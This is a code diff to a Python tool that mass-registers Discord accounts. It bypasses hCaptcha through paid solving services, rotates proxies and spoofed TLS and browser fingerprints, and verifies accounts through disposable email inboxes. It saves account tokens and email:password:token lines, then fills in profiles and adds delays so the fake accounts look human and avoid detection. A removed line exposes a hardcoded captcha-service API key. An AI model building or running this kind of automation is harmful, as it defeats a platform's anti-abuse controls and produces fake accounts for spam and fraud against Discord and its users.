@@ -145,6 +145,12 @@ class Status:
 
                 current_time = time.time()
 
+                if current_time - last_clear_time >= 200:
+                    os.system('cls')
+                    last_clear_time = current_time
+
+                time.sleep(1)
+
         except Exception as e:
             print(e)
 
@@ -262,14 +268,12 @@ class user:
             }
 
             req = session.post("https://discord.com/api/v9/unique-username/username-attempt-unauthed", headers=headers, json=payload, proxy=f"http://{proxy}")
-            try:
-                if not req.json()['taken']:
-                    valid_username = user
-                    return valid_username
-                else:
-                    time.sleep(1)
-            except Exception as e:
-                print("ERR: " )
+            if not req.json()['taken']:
+                valid_username = user
+                return valid_username
+            else:
+                time.sleep(1)
+
     def generate_random_birthdate():
             year = random.randint(1970, 1999)
             month = random.randint(1, 12)
@@ -392,7 +396,7 @@ def SolveCaptchaCapsolver(sitekey, url, ua, proxy):
             while True:
                 try:
                     taskId = requests.post("https://api.capsolver.com/createTask", json={
-                        "clientKey": "CAP-A5650722CE866186EF90736380C73F40",
+                        "clientKey": config['captcha']['api_key'],
                         "task": {
                             "type": "HCaptchaTurboTask",
                             "websiteURL": url,
@@ -454,7 +458,10 @@ class Generator:
         username = user.get_username()
         c = Cookie(proxy, session)
         cookies = c.get_cookies()
-        captcha_token = SolveCaptchaCapmonster("4c672d35-0701-42b2-88c3-78380b0db560", "https://discord.com/", ua, proxy)
+        if(config['captcha']['service'] == "capmonster"):
+            captcha_token = SolveCaptchaCapmonster("4c672d35-0701-42b2-88c3-78380b0db560", "https://discord.com/", ua, proxy)
+        elif config['captcha']['service'] == 'capsolver':
+            captcha_token = SolveCaptchaCapsolver("4c672d35-0701-42b2-88c3-78380b0db560", "https://discord.com/", ua, proxy)
         try:
             headers = {
                 "authority": "discord.com",
@@ -487,7 +494,7 @@ class Generator:
                 "captcha_key": captcha_token
             }
 
-            req = session.post("https://discord.com/api/v9/auth/register", headers=headers, json=payload, proxy=f"http://{proxy}", timeout = 10)
+            req = session.post("https://discord.com/api/v9/auth/register", headers=headers, json=payload, proxy=f"http://{proxy}")
         except Exception as e:
             traceback.print_exc()
             Log.error("Excepted - "+str(e))
@@ -497,9 +504,8 @@ class Generator:
             total += 1
             print(total)
             Log.success(f"{token[:30]}...")
+            time.sleep(7)
             checker = session.get("https://discord.com/api/v9/users/@me/affinities/users", headers={'authority': 'discord.com', 'accept': '*/*', 'accept-language': 'en-US,en;q=0.9', 'cookie': f'__dcfduid={cookies[0]}; __sdcfduid={cookies[1]}; __cfruid={cookies[2]}; ', 'authorization': token, 'origin': 'https://discord.com', 'referer': 'https://discord.com/@me', 'Content-Type': 'application/json', 'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': ua, 'x-debug-options': 'bugReporterEnabled', 'x-discord-locale': 'en-US', 'x-fingerprint': cookies[3], 'x-super-properties': xtrack}, proxy=f"http://{proxy}")
-            if checker.status_code != 200:
-                return
             if checker.status_code == 200:
                     Log.unlocked(token)
                     global unlocked
@@ -507,6 +513,7 @@ class Generator:
                     print(unlocked)
                     with open("./output/unlocked.txt", "a") as f:
                         f.write(f"{token}\n")
+                    time.sleep(3)
                     hmnzd=[]
                     human_headers = {
                                     'authority': 'discord.com',
@@ -535,6 +542,7 @@ class Generator:
                                 }
                     if pfp:
                         user.onliner(token)
+                        time.sleep(5)
                         payload = {
                             "avatar": f"data:image/png;base64,{user.getAvatar()}"
                         }
@@ -543,6 +551,7 @@ class Generator:
                             hmnzd.append("PFP")
 
                     if bio:
+                        time.sleep(3)
                         payload = {"bio": str(user.get_bio())}
                         r = session.patch('https://discord.com/api/v9/users/@me/profile', headers=human_headers, json=payload, proxy=f"http://{proxy}")
 
@@ -550,6 +559,7 @@ class Generator:
                             hmnzd.append("BIO")
 
                     if pronouns:
+                        time.sleep(2)
                         payload ={"pronouns":str(user.get_pronouns())}
                         r = session.patch('https://discord.com/api/v9/users/@me/profile', headers=human_headers, json=payload, proxy=f"http://{proxy}")
 
@@ -558,7 +568,7 @@ class Generator:
 
 
                     if hypesquad:
-
+                        time.sleep(4)
                         payload = {"house_id": random.choice([1,2,3])}
                         r = session.post('https://discord.com/api/v9/hypesquad/online', headers=human_headers, json=payload, proxy=f"http://{proxy}")
                         if r.status_code == 204:
@@ -575,8 +585,8 @@ class Generator:
                 with open("./output/locked.txt", "a") as f:
                     f.write(f"{token}\n")
     def ev():
-        password = "Al1ceTokens" # TEMP
- 
+        password =config['user']['password']# TEMP
+
 
         try:
             kopechka_request = requests.get(url=f"https://api.kopeechka.store/mailbox-get-email?site=discord.com&mail_type={config['email_verification']['mail_type']}&sender=&regex=&token={config['email_verification']['kopechka_key']}&soft=&investor=&type=JSON&subject=&clear=&api=2.0")
@@ -589,8 +599,10 @@ class Generator:
             Log.error("Error getting mail")
             return
         proxy = Misc.proxy()
+        captcha_token = ""
         while True:
             try:
+
                 if(config['captcha']['service'] == "capmonster"):
                     captcha_token = SolveCaptchaCapmonster("4c672d35-0701-42b2-88c3-78380b0db560", "https://discord.com/", ua, proxy)
                 elif config['captcha']['service'] == 'capsolver':
@@ -602,7 +614,7 @@ class Generator:
         try:
             #captcha_token = solver("4c672d35-0701-42b2-88c3-78380b0db560")
             xtrack = Misc.xtrack()
-            session = tls_client.Session(client_identifier="safari_ios_16_0", random_tls_extension_order=True)
+            session = tls_client.Session(client_identifier=random.choice(["safari_ios_16_0", "chrome112", "safari_ios_15_6", "okhttp4_android_13", "safari_16_0", "opera_90","opera_90"]), random_tls_extension_order=True)
 
 
             username = user.get_username()
@@ -634,6 +646,7 @@ class Generator:
                 "X-Fingerprint": cookies[3],
                 'x-super-properties': xtrack
             }
+
             payload = {
                             "fingerprint": cookies[3],
                             "email": email,
@@ -646,14 +659,14 @@ class Generator:
                             "unique_username_registration": True
                         }
 
-            if(config['user']['invite'] !=""):
-                payload['invite'] = config['user']['invite']
             r = session.post("https://discord.com/api/v9/auth/register", headers=headers, json=payload, proxy=f"http://{proxy}")
+            
         except Exception as e:
             Log.error("Error caught! Show this to developer: "+ base64.b64encode(f'{"Part":"Reqto","Line": {traceback.extract_tb(sys.exc_info()[2])[-1][1]}, "err":{str(e)}}'.encode('utf-8')).decode('utf-8'))
         if r.status_code == 201:
 
             token = r.json()['token']
+            user.onliner(token)
             try:
                 with open("./output/total.txt", "a") as f:
                     f.write(f"{token}\n")
@@ -662,16 +675,13 @@ class Generator:
             global total
             total += 1
             Log.success(f"{token[:30]}...")
-            if(session.get("https://discord.com/api/v9/users/@me/affinities/users", headers={'authority': 'discord.com', 'accept': '*/*', 'accept-language': 'en-US,en;q=0.9', 'cookie': f'__dcfduid={cookies[0]}; __sdcfduid={cookies[1]}; __cfruid={cookies[2]}; ', 'authorization': token, 'origin': 'https://discord.com', 'referer': 'https://discord.com/@me', 'Content-Type': 'application/json', 'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': ua, 'x-debug-options': 'bugReporterEnabled', 'x-discord-locale': 'en-US', 'x-fingerprint': cookies[3], 'x-super-properties': xtrack}, proxy=f"http://{proxy}").status_code != 200):
-                Log.locked(f"{token[:30]}...")
-                return
             link = None
             while link == None:
                     email_verify = requests.get(url=f"https://api.kopeechka.store/mailbox-get-message?full=1&id={email_id}&token={config['email_verification']['kopechka_key']}&type=json&api=2.0")
                     if email_verify.json()['value'] != "WAIT_LINK":
                         link = email_verify.json()['value']
                         break
-                    time.sleep(3)
+                    time.sleep(2)
 
             response = requests.head(email_verify.json()['value'], allow_redirects=True)
             final_url = response.url
@@ -706,15 +716,15 @@ class Generator:
                     raise Exception
                 verified = True
             except:
+                verify_topken = ""
                 if config['email_verification']['captcha']['solve_captcha'] == True:
                     while True:
                         try:
-                            verify_topken=""
-                             if(config['captcha']['service'] == "capmonster"):
-                                verify_topken = SolveCaptchaCapmonster("4c672d35-0701-42b2-88c3-78380b0db560", "https://discord.com/", ua, proxy)
+                            if(config['captcha']['service'] == "capmonster"):
+                                verify_topken = SolveCaptchaCapmonster("f5561ba9-8f1e-40ca-9b5b-a0b3f719ef34", "https://discord.com/", ua, proxy)
                             elif config['captcha']['service'] == 'capsolver':
-                                verify_topken = SolveCaptchaCapsolver("4c672d35-0701-42b2-88c3-78380b0db560", "https://discord.com/", ua, proxy)
-                            if captcha_token != None:
+                                verify_topken = SolveCaptchaCapsolver("f5561ba9-8f1e-40ca-9b5b-a0b3f719ef34", "https://discord.com/", ua, proxy)
+                            if verify_topken != None:
                                 break
                         except:
                             continue
@@ -757,6 +767,7 @@ class Generator:
                 unlocked += 1
                 with open("./output/unlocked.txt", "a") as f:
                     f.write(f"{email}:{password}:{token}\n")
+                    time.sleep(3)
                     hmnzd=[]
                     human_headers = {
                                     'authority': 'discord.com',
@@ -785,6 +796,7 @@ class Generator:
                                 }
                     if pfp:
                         user.onliner(token)
+                        time.sleep(5)
                         payload = {
                             "avatar": f"data:image/png;base64,{user.getAvatar()}"
                         }
@@ -793,7 +805,7 @@ class Generator:
                             hmnzd.append("PFP")
 
                     if bio:
-
+                        time.sleep(3)
                         payload = {"bio": str(user.get_bio())}
                         r = session.patch('https://discord.com/api/v9/users/@me/profile', headers=human_headers, json=payload, proxy=f"http://{proxy}")
 
@@ -801,7 +813,7 @@ class Generator:
                             hmnzd.append("BIO")
 
                     if pronouns:
-                        
+                        time.sleep(2)
                         payload ={"pronouns":str(user.get_pronouns())}
                         r = session.patch('https://discord.com/api/v9/users/@me/profile', headers=human_headers, json=payload, proxy=f"http://{proxy}")
 
@@ -810,6 +822,7 @@ class Generator:
 
 
                     if hypesquad:
+                        time.sleep(4)
                         payload = {"house_id": random.choice([1,2,3])}
                         r = session.post('https://discord.com/api/v9/hypesquad/online', headers=human_headers, json=payload, proxy=f"http://{proxy}")
                         if r.status_code == 204:
